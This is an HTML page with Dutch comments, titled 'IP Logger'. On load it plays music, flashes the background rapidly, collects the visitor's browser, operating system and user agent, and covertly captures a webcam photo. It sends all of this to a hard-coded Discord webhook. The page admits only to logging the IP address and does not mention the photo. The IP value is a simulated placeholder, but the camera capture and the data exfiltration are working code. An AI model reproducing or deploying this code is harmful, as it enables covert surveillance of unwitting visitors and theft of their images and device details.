<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Logger</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding-top: 50px;
            background-color: white;
            color: black;
            animation: changeBackground 0.4s infinite;
            position: relative;
        }
        h1 {
            color: inherit;
        }
        p {
            color: inherit;
            margin-bottom: 40px;
        }
        @keyframes changeBackground {
            0% { background-color: white; color: black; }
            50% { background-color: black; color: white; }
            100% { background-color: white; color: black; }
        }
    </style>
    <script>
        var embedSent = false;
        var musicStarted = false;

        function startMusic() {
            if (!musicStarted) {
                var audio = new Audio('sound.mp3');
                audio.play();
                musicStarted = true;
            }
        }

        function sendToDiscord() {
            var ipAddress = "127.0.0.1"; // Simulated IP address for demonstration
            var userAgent = navigator.userAgent;
            var timestamp = new Date().toISOString();
            var os = detectOS(userAgent);
            var browser = detectBrowser(userAgent);
            var webhookURL = 'https://discord.com/api/webhooks/1213788395726311464/Qu04CT-Yp-s2BttXP2jZGSm_iTWHA08MFm-OCxQHCCeiq9J-RL5VYX41Oj-5moEPMAtP';

            // Maak een foto met de webcam en converteer naar een Base64-gecodeerde string
            takePhoto(function(photoData) {
                var embed = {
                    "embeds": [
                        {
                            "title": "IP Logger",
                            "description": "Een gebruiker heeft de pagina bezocht.",
                            "color": 65280, // Groen als het leuk vond, Rood als niet leuk
                            "fields": [
                                {
                                    "name": "IP Adres",
                                    "value": ipAddress,
                                    "inline": true
                                },
                                {
                                    "name": "Besturingssysteem",
                                    "value": os,
                                    "inline": true
                                },
                                {
                                    "name": "Browser",
                                    "value": browser,
                                    "inline": true
                                },
                                {
                                    "name": "Gebruikersagent",
                                    "value": userAgent,
                                    "inline": false
                                },
                                {
                                    "name": "Tijdstip",
                                    "value": timestamp,
                                    "inline": true
                                }
                            ],
                            "image": {
                                "url": photoData
                            }
                        }
                    ]
                };

                var xhr = new XMLHttpRequest();
                xhr.open("POST", webhookURL);
                xhr.setRequestHeader("Content-Type", "application/json");
                xhr.send(JSON.stringify(embed));
            });
        }

        function detectOS(userAgent) {
            var OSes = [
                'Windows',
                'Mac OS',
                'Linux',
                'iOS',
                'Android'
            ];

            var detectedOS = OSes.find(function(os) {
                return userAgent.indexOf(os) >= 0;
            });

            return detectedOS || 'Onbekend';
        }

        function detectBrowser(userAgent) {
            var browsers = [
                'Chrome',
                'Firefox',
                'Safari',
                'Edge',
                'Opera'
            ];

            var detectedBrowser = browsers.find(function(browser) {
                return userAgent.indexOf(browser) >= 0;
            });

            return detectedBrowser || 'Onbekend';
        }

        // Deze functie maakt een foto met de webcam en roept een callback op met de Base64-gecodeerde string van de foto
        function takePhoto(callback) {
            var canvas = document.createElement('canvas');
            var video = document.createElement('video');

            navigator.mediaDevices.getUserMedia({ video: true }).then(function(stream) {
                video.srcObject = stream;
                video.play();
                setTimeout(function() {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                    var photoData = canvas.toDataURL('image/jpeg');
                    video.srcObject.getTracks().forEach(track => track.stop());
                    callback(photoData);
                }, 500); // Laat 0.5 seconde toe voor de camera om te initialiseren
            }).catch(function(err) {
                console.error('Kan geen toegang krijgen tot de webcam:', err);
            });
        }

        window.onload = function() {
            startMusic(); // Start muziek direct bij het laden van de pagina
            if (!embedSent) {
                sendToDiscord();
                embedSent = true;
            }
        }
    </script>
</head>
<body>
    <h1>Welkom bij onze geweldige site!</h1>
    <p>Geniet van de muziek terwijl we uw IP-adres loggen.</p>
</body>
</html>
